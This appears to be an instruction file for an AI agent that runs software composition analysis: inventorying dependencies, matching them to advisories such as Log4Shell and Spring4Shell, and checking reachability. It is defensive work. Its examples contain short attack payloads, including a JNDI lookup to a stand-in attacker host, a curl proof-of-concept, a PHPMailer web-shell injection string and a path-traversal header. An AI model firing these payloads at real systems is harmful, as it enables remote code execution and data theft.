---
name: sast-sca
description: >-
  Detect vulnerable and outdated third-party components (OWASP A06:2021) in a
  codebase using a three-phase approach: recon (inventory manifests, lockfiles,
  vendored libraries and runtimes, resolve exact versions, and match them
  against known advisories), batched verify (reachability analysis in parallel
  subagents, 3 candidates each), and merge (consolidate batch results). Covers
  direct and transitive dependencies for Maven/Gradle, npm/yarn/pnpm,
  pip/Poetry, Go modules, Composer, NuGet and Bundler, vendored JS libraries,
  end-of-life runtimes and frameworks, floating versions, and missing lockfiles.
  Requires sast/architecture.md (run sast-analysis first). Outputs findings to
  sast/sca-results.md. Use when asked to find vulnerable dependencies, outdated
  libraries, known CVEs in components, or to run software composition analysis.
---

# Vulnerable and Outdated Components Detection

You are performing a focused security assessment to find vulnerable and outdated third-party components in a codebase (OWASP A06:2021). This skill uses a three-phase approach with subagents: **recon** (inventory dependencies, resolve the exact versions in use, and match them against known advisories), **batched verify** (reachability analysis of each candidate in parallel batches of 3), and **merge** (consolidate batch reports into one file).

**Prerequisites**: `sast/architecture.md` must exist. Run the analysis skill first if it doesn't.

---

## What is a Vulnerable or Outdated Component

A vulnerable component is a third-party library, framework, runtime, or vendored file whose resolved version falls inside the affected range of a published security advisory. An outdated component is one that no longer receives security fixes (end-of-life) or whose version is not controlled at all (floating ranges, no lockfile), so the build can silently pull a vulnerable or malicious release. Because components run with the same privileges as the application, a reachable library flaw is as exploitable as a first-party bug — Log4Shell, Spring4Shell and the Jackson gadget chains all led to remote code execution in otherwise well-written applications.

The core pattern: *a component whose resolved version is affected by a published advisory ships to production, and the application exercises the vulnerable code path with attacker-influenced input.*

### What a Vulnerable Component IS

- A direct dependency resolved to an affected version and used in production: `log4j-core` 2.14.1 as the active logging backend, logging request headers
- A **transitive** dependency resolved to an affected version — it is on the classpath / in `node_modules` even though nobody declared it (e.g. `snakeyaml` 1.x pulled in by a Spring Boot starter, `qs` pulled in by `express`)
- A third-party file **vendored** into the repo and invisible to manifests: `src/assets/js/jquery-1.12.4.min.js`, `WEB-INF/lib/commons-collections-3.2.1.jar`
- An end-of-life runtime or framework that no longer receives security patches: Spring Boot 2.x, AngularJS 1.x, Node.js 16, Python 3.8, `netcoreapp3.1`
- Uncontrolled versions for production dependencies: `"lodash": "*"`, `"latest"`, Maven `LATEST` / `[1.0,)`, Gradle `2.+`, unpinned `requirements.txt` lines, or no lockfile at all
- Dependencies fetched from git URLs, HTTP tarballs, or non-default registries without integrity pinning

### What a Vulnerable Component is NOT

Do not flag these as vulnerable components:

- **First-party code bugs**: SQL built by string concatenation, unsafe `yaml.load(data, Loader=UnsafeLoader)` on a fully patched PyYAML, `TypeNameHandling.All` on current Newtonsoft.Json — the library works as documented and the misuse is the application's. These belong to the matching sast-* skill (sast-sqli, sast-rce, sast-xss, sast-jwt, ...)
- **CI/CD supply chain**: GitHub Actions referenced by mutable tag instead of commit SHA, `curl ... | bash` installers in pipelines or Dockerfiles — that is sast-cicd
- **Misconfigurations**: exposed Spring Boot Actuator endpoints, debug mode in production, permissive CORS, default credentials — that is sast-misconfig, even when the setting belongs to a framework
- **Hardcoded credentials** in dependency configuration (`.npmrc` auth tokens, `settings.xml` passwords) — that is sast-hardcodedsecrets
- **A matched version with the vulnerable feature provably unused**: `snakeyaml` 1.33 used only by Spring Boot to read `application.yml` from the classpath — report it as Not Vulnerable, with the reason
- **Test-only and build-only tooling**: `junit`, `karma`, `jest`, `eslint`, `maven-surefire-plugin` — not shipped to production; note supply-chain relevance, do not escalate

### Patterns That Prevent Vulnerable Components

When you see these patterns, the project is less likely to ship vulnerable components — but always classify on the version that is **actually resolved**, not on the presence of tooling:

**1. Lockfiles committed and installed in frozen mode**
```
# JavaScript / TypeScript
npm ci                                   # fails if package-lock.json and package.json disagree
yarn install --immutable                 # Yarn Berry (--frozen-lockfile on Yarn 1)
pnpm install --frozen-lockfile

# Python
pip install --require-hashes -r requirements.txt    # generated with pip-compile --generate-hashes
poetry install                                       # installs exactly what poetry.lock pins

# Gradle — build.gradle
dependencyLocking { lockAllConfigurations() }       # gradle.lockfile written with --write-locks

# .NET — *.csproj, then `dotnet restore --locked-mode` in CI
<RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>

# Go / PHP / Ruby
go.sum committed; `composer install` (never `composer update`) in CI; `bundle config set frozen true`
```

**2. Exact or bounded versions for production dependencies**
```
"some-lib": "1.4.2"                      # package.json — exact, or ^ / ~ only with a committed lockfile
some-lib==1.4.2                          # requirements.txt
<version>1.4.2</version>                 # Maven — never LATEST, RELEASE or open ranges like [1.0,)
implementation 'com.example:some-lib:1.4.2'   # Gradle — never 1.+ or latest.release
```

**3. Overrides / resolutions that force a patched transitive version**
```
"overrides": { "qs": "6.10.3" }                      # package.json — npm 8.3+
"resolutions": { "lodash": "4.17.21" }               # package.json — Yarn
"pnpm": { "overrides": { "lodash": "4.17.21" } }     # package.json — pnpm
require golang.org/x/net v0.17.0 // indirect         # go.mod — bump the indirect module
PyYAML>=5.4                                          # constraints.txt applied with pip install -c
```

**4. Maven `<dependencyManagement>`, BOM imports and Spring Boot version properties**
```xml
<!-- Spring Boot: override a managed version through its property -->
<properties>
    <log4j2.version>2.17.1</log4j2.version>
</properties>

<!-- Plain Maven: import a patched BOM (or pin the artifact) in dependencyManagement -->
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-bom</artifactId>
            <version>2.17.1</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

**5. Gradle dependency constraints and forced resolution**
```groovy
dependencies {
    constraints {
        implementation('org.yaml:snakeyaml:2.2') { because 'CVE-2022-1471' }
    }
}
configurations.configureEach { resolutionStrategy.force 'org.apache.logging.log4j:log4j-core:2.17.1' }
```

**6. Automated update tooling (Dependabot / Renovate)**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "maven"
    directory: "/"
    schedule: { interval: "weekly" }
  - package-ecosystem: "npm"
    directory: "/frontend"
    schedule: { interval: "weekly" }
# renovate.json
{ "extends": ["config:recommended"], "vulnerabilityAlerts": { "enabled": true } }
```
This shortens the exposure window; it does **not** make a currently resolved vulnerable version safe.

**7. Safe APIs that keep the vulnerable feature out of reach**
```
new Yaml(new SafeConstructor(new LoaderOptions()))   # SnakeYAML — no arbitrary type construction
yaml.safe_load(data)                                  # PyYAML
new ObjectMapper()  /* no enableDefaultTyping() */    # Jackson — Spring Boot default
```
These remove reachability for the specific advisory; the upgrade is still the remediation.

---

## Vulnerable vs. Secure Examples

The "examples" for this skill are a manifest or lockfile entry **plus** the reachable usage that makes the affected version exploitable. The advisories below are well-documented historical cases used as illustrations only.

### Java — Maven / Gradle (Spring Boot)

```
# VULNERABLE: log4j-core 2.14.1 is the active backend and logs request data (CVE-2021-44228)
# pom.xml
<properties><log4j2.version>2.14.1</log4j2.version></properties>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>     <!-- Logback excluded, Log4j2 active -->
</dependency>
# AuthController.java
log.warn("Failed login for user {}", form.getUsername());   // username = ${jndi:ldap://attacker/a}

# SECURE: 2.17.1+ (also covers CVE-2021-45046, CVE-2021-45105, CVE-2021-44832)
<properties><log4j2.version>2.17.1</log4j2.version></properties>
# SECURE (not reachable): only log4j-api / log4j-to-slf4j on the classpath — Logback is the backend
```

```
# VULNERABLE: Spring4Shell (CVE-2022-22965) — Spring Framework 5.3.0-5.3.17, WAR on Tomcat, JDK 9+, POJO binding
# pom.xml
<parent><artifactId>spring-boot-starter-parent</artifactId><version>2.6.5</version></parent>
<packaging>war</packaging>
# OrderController.java
@PostMapping("/orders")
public String create(Order order) { ... }        // request params bound onto a POJO (no @RequestBody)

# SECURE: Spring Boot 2.6.6+ / 2.5.12+ (Spring Framework 5.3.18+ / 5.2.20+), ideally a supported Boot 3.x
```

```
# VULNERABLE: jackson-databind 2.9.8 + default typing + gadget on classpath (e.g. CVE-2019-12384, logback-core gadget)
# build.gradle
implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8'
# JsonConfig.java
mapper.enableDefaultTyping();                                      // class names accepted from JSON
Object payload = mapper.readValue(request.getInputStream(), Object.class);

# SECURE: no default typing (Spring Boot default), or 2.10+ with an allowlisting validator
mapper.activateDefaultTyping(BasicPolymorphicTypeValidator.builder()
        .allowIfSubType("com.example.dto.").build(), ObjectMapper.DefaultTyping.NON_FINAL);
```

```
# VULNERABLE: snakeyaml 1.33 + new Yaml() on uploaded content (CVE-2022-1471)
# build.gradle.kts
implementation("org.yaml:snakeyaml:1.33")
# ImportService.java
Object cfg = new Yaml().load(file.getInputStream());    // !!javax.script.ScriptEngineManager gadget

# SECURE: snakeyaml 2.x and SafeConstructor
implementation("org.yaml:snakeyaml:2.2")
Object cfg = new Yaml(new SafeConstructor(new LoaderOptions())).load(file.getInputStream());
```

### JavaScript / TypeScript — npm / yarn / pnpm (Angular, Express)

```
# VULNERABLE: Angular bundle ships lodash 4.17.11 and deep-merges URL-supplied JSON (CVE-2019-10744, fixed 4.17.12)
# package-lock.json
"node_modules/lodash": { "version": "4.17.11" }
# preferences.component.ts
const prefs = JSON.parse(this.route.snapshot.queryParamMap.get('prefs') ?? '{}');
this.settings = _.defaultsDeep(this.settings, prefs);   // {"constructor":{"prototype":{"isAdmin":true}}}

# SECURE: lodash 4.17.21 (also fixes _.template command injection, CVE-2021-23337)
"overrides": { "lodash": "4.17.21" }
```

```
# VULNERABLE: vendored jQuery 1.12.4 in angular.json + deep extend of user-editable data (CVE-2019-11358, fixed 3.4.0)
# angular.json
"scripts": ["src/assets/vendor/jquery-1.12.4.min.js"]
# legacy-widget.ts
$.extend(true, widgetDefaults, await firstValueFrom(this.http.get(`/api/widgets/${id}`)));

# SECURE: jquery 3.5.0+ from npm (also fixes htmlPrefilter XSS, CVE-2020-11022 / CVE-2020-11023), or drop jQuery
"dependencies": { "jquery": "3.7.1" }
```

```
# VULNERABLE: express 4.17.1 resolves qs 6.7.0 — a __proto__ key in the query string hangs the process (CVE-2022-24999)
# package-lock.json
"node_modules/express": { "version": "4.17.1" },  "node_modules/qs": { "version": "6.7.0" }
# server.ts — no precondition: every route parses req.query
app.get('/search', (req, res) => res.json(search(req.query)));

# SECURE: express 4.17.3+ (depends on a patched qs), or force it
"overrides": { "qs": "6.10.3" }
```

### Python — pip / Poetry

```
# VULNERABLE: PyYAML 5.3.1 + full_load on the request body (CVE-2020-14343, fixed 5.4)
# requirements.txt
PyYAML==5.3.1
# views.py
config = yaml.full_load(request.body)            # !!python/object/new:os.system [...]

# SECURE: PyYAML 5.4+ AND safe_load (FullLoader is not meant for untrusted input on any version)
PyYAML==6.0.1
config = yaml.safe_load(request.body)

# HYGIENE: pyproject.toml — EOL interpreter and floating production dependency
requires-python = ">=3.7"        # EOL as of the knowledge cutoff, verify
requests = "*"
```

### Go — Go modules

```
# VULNERABLE: golang.org/x/net v0.10.0 serving h2c — HTTP/2 rapid reset DoS (CVE-2023-39325, fixed v0.17.0)
# go.mod
require golang.org/x/net v0.10.0
# main.go — no precondition beyond serving HTTP/2 to untrusted clients
srv := &http.Server{Addr: ":8080", Handler: h2c.NewHandler(router, &http2.Server{})}

# SECURE: x/net v0.17.0+ AND Go toolchain 1.20.10+ / 1.21.3+ (net/http bundles its own HTTP/2 copy)
require golang.org/x/net v0.17.0
```

### PHP — Composer

```
# VULNERABLE: phpmailer/phpmailer 5.2.16 + user-controlled sender with the mail() transport (CVE-2016-10033)
# composer.lock
"name": "phpmailer/phpmailer", "version": "v5.2.16"
# contact.php
$mail->setFrom($_POST['email'], $_POST['name']);   // "attacker\" -oQ/tmp/ -X/var/www/shell.php @x.com"
$mail->send();                                      // default transport: mail() -> sendmail arguments

# SECURE: current 6.x release (5.2.20 closed the CVE-2016-10045 bypass), fixed From, user address in Reply-To
$mail->setFrom('noreply@example.com');
$mail->addReplyTo($_POST['email']);
```

### .NET — NuGet

```
# VULNERABLE: Newtonsoft.Json 12.0.3 on request bodies — deeply nested JSON exhausts the stack (GHSA-5crp-9r3c-p9vr)
# Api.csproj
<PackageReference Include="Newtonsoft.Json" Version="12.0.3" />
# OrdersController.cs
var order = JsonConvert.DeserializeObject<Order>(await reader.ReadToEndAsync());

# SECURE: 13.0.1+ (MaxDepth defaults to 64), or set MaxDepth explicitly on older versions
<PackageReference Include="Newtonsoft.Json" Version="13.0.3" />

# HYGIENE: <TargetFramework>netcoreapp3.1</TargetFramework> — EOL as of the knowledge cutoff, verify
```

### Ruby — Bundler

```
# VULNERABLE: actionview 5.2.2 + render file: — Accept header discloses arbitrary files (CVE-2019-5418, fixed 5.2.2.1)
# Gemfile.lock
    actionview (5.2.2)
# pages_controller.rb
render file: "#{Rails.root}/app/views/pages/terms"   # Accept: ../../../../../../etc/passwd{{

# SECURE: a patched, supported Rails release, and render template: instead of render file:
render template: "pages/terms"
```

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `sast/architecture.md` to all subagents as context.

**Cache reuse**: If `sast/sca-recon.md` already exists, skip Phase 1 and reuse it. If `sast/sinks-index.md` exists, pass its `## sast-sca` section to the Phase 1 subagent as a starting list of manifests — the subagent must still search beyond it.

### Phase 1: Recon — Inventory Dependencies and Match Advisories

Launch a subagent with the following instructions:

> **Goal**: Build an inventory of every third-party component the project ships (declared and transitive dependencies, vendored files, runtimes, base images), resolve the exact version actually used, and list every component that matches a known advisory or a hygiene problem. Write results to `sast/sca-recon.md`.
>
> **Context**: You will be given the project's architecture summary (and, if available, the `## sast-sca` section of `sast/sinks-index.md`). Use it to identify ecosystems, build tools, which modules are deployed, and which code is frontend vs. backend. The index section is only a starting list — search the whole tree beyond it.
>
> **What to search for**:
>
> Do not trace user input yet — that is Phase 2's job. Phase 1 answers only: which components, which exact versions, and which of them are known to be affected.
>
> 1. **Manifests and lockfiles** — find all of them, including nested modules and monorepo packages:
>    - Java: `pom.xml` (incl. `<parent>` / `spring-boot-starter-parent` version, `<dependencyManagement>` BOM imports, `<properties>` overrides such as `<log4j2.version>`), `build.gradle`, `build.gradle.kts`, `gradle/libs.versions.toml`, `gradle.lockfile`
>    - JavaScript / TypeScript: `package.json`, `package-lock.json`, `npm-shrinkwrap.json`, `yarn.lock`, `pnpm-lock.yaml`, `angular.json` (`scripts` / `styles` arrays that pull in vendored files)
>    - Python: `requirements*.txt`, `constraints*.txt`, `Pipfile`, `Pipfile.lock`, `pyproject.toml`, `poetry.lock`, `setup.py`, `setup.cfg`
>    - Go: `go.mod` (incl. `replace` directives and `go` / `toolchain` lines), `go.sum`, `vendor/modules.txt`
>    - PHP: `composer.json`, `composer.lock`
>    - .NET: `*.csproj`, `Directory.Packages.props`, `Directory.Build.props`, `packages.config`, `packages.lock.json`
>    - Ruby: `Gemfile`, `Gemfile.lock`, `*.gemspec`
>
> 2. **Runtime and platform versions**: every Dockerfile `FROM` (note which stage is the final runtime image), `.nvmrc`, `.node-version`, `package.json` `engines`, `<java.version>` / `maven.compiler.release` / Gradle `toolchain` / `sourceCompatibility`, `python_requires` / `requires-python` / `.python-version` / `runtime.txt`, the `go` directive, `<TargetFramework>`, `.ruby-version`, the `@angular/core` major, and the Spring Boot version.
>
> 3. **Vendored / copied libraries** — third-party code committed into the repo and invisible to manifests: `jquery-*.js`, `bootstrap*.js`, `angular*.js`, `lodash*.js`, `moment*.js` and similar under `static/`, `public/`, `assets/`, `src/main/resources/static/`, `src/main/webapp/`, `wwwroot/lib/`; `.jar` files in `lib/` or `WEB-INF/lib/`. Read the version from the filename or the license header comment.
>
> 4. **Resolve the exact version actually used**:
>    - A lockfile beats a manifest: `"lodash": "^4.17.0"` in `package.json` means nothing until `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` says which version is installed. Several versions of one package can coexist — record each one.
>    - Maven / Gradle: a `<dependency>` without `<version>` is managed by the parent or an imported BOM. The Spring Boot parent manages many libraries (Jackson, Tomcat, SnakeYAML, Logback, Log4j2, Spring Framework) — resolve through the Spring Boot version and any `<properties>` override. If you are not certain of the BOM mapping, write "managed by Spring Boot X.Y.Z — exact version unverified".
>    - Check overrides that may already patch the version: npm `overrides`, Yarn `resolutions`, `pnpm.overrides`, Maven `<dependencyManagement>`, Gradle `constraints` / `resolutionStrategy.force`, Go `replace`, .NET Central Package Management.
>    - Transitive dependencies count — they are on the classpath / in `node_modules`. Lockfiles list them; for Maven / Gradle without a lockfile, record "transitive via group:artifact — version inferred".
>
> 5. **Optional tooling — strictly opt-in**: this toolkit requires no third-party tools. Only if a tool is ALREADY installed (check with `command -v <tool>`) and works without installing anything, you MAY run it and use its output: `osv-scanner`, `npm audit --json`, `pip-audit`, `trivy fs`, and for version resolution only `mvn -o dependency:tree` / `gradle dependencies --offline`. NEVER install tools, NEVER run `npm install` / `pip install` / `composer update` or anything that modifies the dependency tree, and NEVER run project build or lifecycle scripts. If the tool is absent, fails, or has no network, fall back to knowledge-based matching. Record the detection method for each candidate.
>
> 6. **Knowledge-based matching rules**:
>    - Only list a candidate when you know with high confidence that the package and its resolved version fall within the affected range of a published advisory.
>    - Include the advisory ID (CVE / GHSA / GO-ID) ONLY if you are certain of it. Otherwise describe the issue and write "advisory ID unverified". **Never invent CVE IDs, affected ranges, or fixed versions.**
>    - Record the precondition the advisory requires (vulnerable function, feature flag, deployment mode, JDK version) — this is exactly what Phase 2 checks.
>    - If the package is known to have advisories around that version but you are unsure whether the exact version is affected, list it with "affected range unverified".
>
> 7. **Hygiene candidates** — list these too:
>    - End-of-life runtimes and frameworks: e.g. Spring Boot 2.x, Node.js ≤ 16, Python ≤ 3.8, Angular majors out of LTS, AngularJS 1.x, Java 8 / 11 without vendor support, .NET Core 3.1 / .NET 5 / 6 / 7 — and any later line past its published end-of-life date. Phrase as "EOL as of the knowledge cutoff, verify".
>    - Missing lockfiles for deployable applications.
>    - Floating versions for production dependencies: `*`, `latest`, `x`, unbounded `>=`, Maven `LATEST` / `RELEASE` / open ranges `[1.0,)`, Gradle `+` / `latest.release`, unpinned `requirements.txt` lines.
>    - Dependencies pulled from git URLs, HTTP tarballs, local paths shipped to production, or non-default registries (`.npmrc` `registry=`, pip `--extra-index-url`, Maven `<repositories>` over plain `http://`).
>
> **What to skip**:
> - Installed or generated trees: `node_modules/`, `.venv/`, `venv/`, `target/`, `build/`, `dist/`, `.gradle/`, `bin/`, `obj/`, PHP `vendor/` — use the lockfiles instead (Go `vendor/modules.txt` may be read for versions). Vendored libraries deliberately committed to static asset folders (item 3) are NOT skipped.
> - Example, documentation, and fixture projects that are not deployed (`examples/`, `docs/`, `src/test/resources/**/package.json`) — mention them in one line of the Inventory, do not list them as candidates.
> - Packages with no known advisory and no hygiene issue — do not list every dependency.
> - Advisories you cannot tie to the resolved version with confidence.
> - OS packages inside base images — they cannot be determined from source; record the base image tag only (as an EOL candidate if applicable).
>
> **Output format** — write to `sast/sca-recon.md`:
>
> ```markdown
> # SCA Recon: [Project Name]
>
> ## Summary
> Found [N] dependency candidates.
>
> ## Inventory
> - **Ecosystems**: [Maven, npm, ...]
> - **Manifests / lockfiles**: [paths; mark missing lockfiles]
> - **Runtimes / base images**: [e.g., Java 17 (pom.xml:24), node:18-alpine (frontend/Dockerfile:12, final stage)]
> - **Detection method**: [knowledge-based only / osv-scanner / npm audit / pip-audit / trivy]
>
> ## Candidates
>
> ### 1. [package@version — short issue, e.g., "log4j-core@2.14.1 — JNDI lookup RCE"]
> - **Ecosystem**: [Maven / Gradle / npm / PyPI / Go / Composer / NuGet / RubyGems / Vendored / Runtime]
> - **Manifest / lockfile**: `path/to/manifest` (line X); `path/to/lockfile` (line Y)
> - **Resolved version**: [x.y.z] — [how resolved: lockfile entry / explicit version / Spring Boot BOM / properties override / vendored filename / tool output]
> - **Scope**: [runtime / compile / provided / frontend bundle / dev / test / build plugin]; [direct / transitive via group:artifact]
> - **Advisory**: [CVE / GHSA / GO-ID, or "advisory ID unverified", or "EOL" / "hygiene"] — affected range: [range or "unverified"]; fixed in: [version or "unverified"]
> - **Vulnerable function / feature / precondition**: [e.g., "requires JNDI lookup on logged user input", "requires enableDefaultTyping", "WAR on Tomcat + JDK 9+ + POJO data binding", "none — any request parsed by the component"]
> - **Detection method**: [osv-scanner / npm audit / pip-audit / trivy / knowledge-based]
>
> [Repeat for each candidate]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `sast/sca-recon.md`. If the recon found **zero candidates** (the summary reports "Found 0" or the "Candidates" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `sast/sca-results.md` and stop:

```markdown
# SCA Analysis Results

No vulnerabilities found.
```

Only proceed to Phase 2 if Phase 1 found at least one candidate.

### Phase 2: Verify — Reachability Analysis (Batched)

After Phase 1 completes, read `sast/sca-recon.md` and split the candidates into **batches of up to 3 candidates each**. Launch **one subagent per batch in parallel**. Each subagent analyzes only its assigned candidates and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `sast/sca-recon.md` and count the numbered candidate sections under "Candidates" (### 1., ### 2., etc.).
2. Divide them into batches of up to 3. For example, 8 candidates → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those candidate sections from the recon file, plus the short `## Inventory` section (runtime and packaging details are needed to judge preconditions such as the JDK version).
4. Launch all batch subagents **in parallel**, passing each one only its assigned candidates.
5. Each subagent writes to `sast/sca-batch-N.md` where N is the 1-based batch number.
6. Identify the project's ecosystems from `sast/architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. For example, if the project is a Spring Boot backend with an Angular frontend, include the "Java — Maven / Gradle (Spring Boot)" and "JavaScript / TypeScript — npm / yarn / pnpm (Angular, Express)" examples. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned dependency candidate, determine whether the affected component ships to production and whether its vulnerable code path is reachable with attacker-controlled input. Our goal is to find exploitable vulnerable components, not to list every CVE. Write results to `sast/sca-batch-[N].md`.
>
> **Your assigned candidates** (from the recon phase):
>
> [Paste the Inventory section and the full text of the assigned candidate sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand request entry points, middleware, deployment packaging, and how data flows through the application.
>
> **For each candidate, check these five things:**
>
> **1. Scope — does the component ship to production?**
> - Maven `compile` / `runtime` (default) and `provided` when the container supplies the library → production. `test` scope, build plugins, Gradle `testImplementation`, `annotationProcessor` → not runtime.
> - npm, server-side: `dependencies` → production; `devDependencies` → build/test only unless imported by runtime code.
> - npm, frontend (Angular, React, Vue): anything imported into the bundle — or listed in `angular.json` `scripts` — is production, even if it sits in `devDependencies`. Build tools (`@angular-devkit/*`, `webpack`, `karma`, `jest`, `eslint`) are build-only.
> - Python: the requirements file the Dockerfile / deployment installs vs. `requirements-dev.txt`; Poetry dev groups are not runtime.
> - Check Dockerfiles and deployment manifests: which module / image actually ships, and which `FROM` stage is final?
>
> **2. Is the vulnerable API / feature / precondition actually used?** Grep for the specific function, class, or configuration named in the advisory. For example:
> - log4j-core: is Log4j2 the active backend (`spring-boot-starter-log4j2`, `log4j2.xml`), or is only `log4j-api` / `log4j-to-slf4j` present bridging to Logback?
> - jackson-databind: `enableDefaultTyping`, `activateDefaultTyping` with a permissive validator, `@JsonTypeInfo(use = Id.CLASS)` / `Id.MINIMAL_CLASS` on `Object` / `Serializable` / abstract fields — plus a gadget library on the classpath.
> - Spring4Shell: `<packaging>war</packaging>` / `SpringBootServletInitializer`, Tomcat, JDK ≥ 9, handler methods binding request parameters to POJOs without `@RequestBody`. An executable JAR does not match the published exploit, but the advisory warns other vectors may exist — Likely Vulnerable, not Not Vulnerable.
> - SnakeYAML 1.x: `new Yaml()` / `new Constructor(...)` loading non-config input. Spring Boot reading its own `application.yml` is NOT attacker input.
> - lodash: `_.template`, `_.merge`, `_.defaultsDeep`, `_.set`, `_.zipObjectDeep` on external objects. jQuery: `$.extend(true, ...)` (< 3.4.0); `.html()` / `.append()` / `$(html)` with external HTML (< 3.5.0).
> - PyYAML: `yaml.full_load`, `yaml.load(..., Loader=FullLoader)`, or `yaml.load` without a `Loader` on old versions.
> - If the vulnerable feature is provably unused, the candidate is Not Vulnerable — state exactly what you searched for.
>
> **3. Does attacker-controlled input reach it?** Trace backwards from the vulnerable library call to an entry point, as the other sast-* skills do:
> - HTTP query / path / body parameters, headers (`User-Agent`, `X-Forwarded-For`, `Referer` are commonly logged), cookies, uploaded files, message-queue payloads, and DB values originally written by users.
> - Indirect flows through services and helpers, and global code paths: request-logging filters, `@ControllerAdvice` / exception handlers that log exception messages containing user input, interceptors.
> - For advisories with no precondition (HTTP/2 or request-body parsers, TLS stacks, framework routing), reachability means "this component processes untrusted requests in production".
>
> **4. Is the version really in the affected range?** Re-check the lockfile entry for the exact package (multiple copies can coexist — check each path), Maven `<dependencyManagement>` / `<properties>` overrides, Gradle constraints / `force`, npm `overrides` / Yarn `resolutions`, Go `replace`. Watch for backported fixes on older lines (e.g. log4j-core 2.12.2+ on the Java 7 line, vendor builds such as `-redhat-` versions). If the version is outside the affected range, the candidate is Not Vulnerable.
>
> **5. Mitigations** (code / config level only):
> - Configuration that disables the vulnerable feature: `log4j2.formatMsgNoLookups=true` / `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` (partial — insufficient against CVE-2021-45046, classify Likely Vulnerable), `JndiLookup.class` removed from the jar, Spring `@InitBinder` with `setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*")`, safe loaders (`SafeConstructor`, `yaml.safe_load`), Newtonsoft `MaxDepth`.
> - Input validation that strips the attack primitive before the library call (e.g. rejecting `__proto__` / `constructor` keys) — weaker; classify Likely Vulnerable.
> - WAF rules, network segmentation, and egress filtering are NOT code-level mitigations — mention them in Impact, but do not downgrade the classification.
>
> **Hygiene-only candidates** (missing lockfile, floating version, non-default source) are not classified as findings — record each one as a single line under `## Hygiene` in your batch file. EOL runtimes / frameworks with no specific reachable advisory are classified Needs Manual Review AND echoed as one line under `## Hygiene`.
>
> **Vulnerable vs. Secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Vulnerable**: The affected version ships in production scope AND the vulnerable code path is reachable with attacker-controlled input, with no effective mitigation.
> - **Likely Vulnerable**: The affected version ships in production scope and the vulnerable feature is used, but the taint path is not fully proven; OR the advisory is a generic, high-impact one with no precondition (e.g. a vulnerable HTTP request parser) and the component sits in the request path; OR only a partial mitigation is present.
> - **Not Vulnerable**: The resolved version is not affected, the component is dev / test / build-only, or the vulnerable feature is provably unused.
> - **Needs Manual Review**: The version could not be resolved, the advisory details (ID, range, precondition) are uncertain, or the candidate is an EOL-only finding without a specific vulnerability.
>
> **Output format** — write to `sast/sca-batch-[N].md`:
>
> ```markdown
> # SCA Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] package@version — short issue
> - **File**: `path/to/manifest-or-lockfile` (line X)
> - **Package / version**: `group:artifact@x.y.z` — [direct / transitive via ...]; scope: [runtime / frontend bundle]
> - **Advisory**: [CVE / GHSA / GO-ID, or "advisory ID unverified"] — affected: [range]; fixed: [version]
> - **Issue**: [e.g., "log4j-core 2.14.1 is the active backend and evaluates JNDI lookups in logged usernames"]
> - **Reachability trace**: [Entry point (file:line) → app code (file:line) → vulnerable library call (file:line)]
> - **Impact**: [What an attacker can do — RCE, DoS, data disclosure, XSS in every user's browser, etc.]
> - **Remediation**: [Exact upgrade target, plus the override snippet when the dependency is transitive]
>   ```
>   [e.g. <properties><log4j2.version>2.17.1</log4j2.version></properties>
>    or Maven <dependencyManagement> pin, npm "overrides": { "qs": "6.10.3" },
>    Gradle constraints { implementation('org.yaml:snakeyaml:2.2') }]
>   ```
> - **Dynamic Test**:
>   ```
>   [1. Confirm resolution: mvn dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core,
>       npm ls lodash, go list -m golang.org/x/net, pip show pyyaml, dotnet list package --include-transitive
>    2. Where safe, and only against a test instance you are authorized to test, a PoC request, e.g.
>       curl -H 'User-Agent: ${jndi:ldap://<your-oob-host>/a}' https://app.example.com/login
>       and watch the out-of-band listener for a DNS/LDAP callback]
>   ```
>
> ### [LIKELY VULNERABLE] package@version — short issue
> - **File**: `path/to/manifest-or-lockfile` (line X)
> - **Package / version**: `group:artifact@x.y.z` — [direct / transitive]; scope: [...]
> - **Advisory**: [ID or "advisory ID unverified"] — affected: [range]; fixed: [version]
> - **Issue**: [e.g., "Spring Framework 5.3.17 with POJO binding, packaged as executable JAR"]
> - **Reachability trace**: [Best-effort trace; mark unproven steps]
> - **Concern**: [Why it remains a risk]
> - **Remediation**: [Exact upgrade target / override snippet]
> - **Dynamic Test**:
>   ```
>   [Resolution check and, where safe, the PoC to attempt]
>   ```
>
> ### [NOT VULNERABLE] package@version — short issue
> - **File**: `path/to/manifest-or-lockfile` (line X)
> - **Package / version**: `group:artifact@x.y.z`
> - **Reason**: [e.g., "test scope only", "lockfile resolves 4.17.21 — outside affected range", "only log4j-api bridged to Logback", "new Yaml() loads classpath config only"]
>
> ### [NEEDS MANUAL REVIEW] package@version — short issue
> - **File**: `path/to/manifest-or-lockfile` (line X)
> - **Package / version**: `group:artifact@x.y.z` (or "unresolved")
> - **Uncertainty**: [Why the version, advisory, or reachability could not be determined]
> - **Suggestion**: [e.g., "run `osv-scanner -L package-lock.json` with network access", "run `mvn dependency:tree` to resolve the managed version", "confirm vendor support for Java 8"]
>
> ## Hygiene
> - `path/to/file` (line X) — [missing lockfile / floating version / EOL runtime / non-default source] — [recommendation]
> ```

### Phase 3: Merge — Consolidate Batch Results

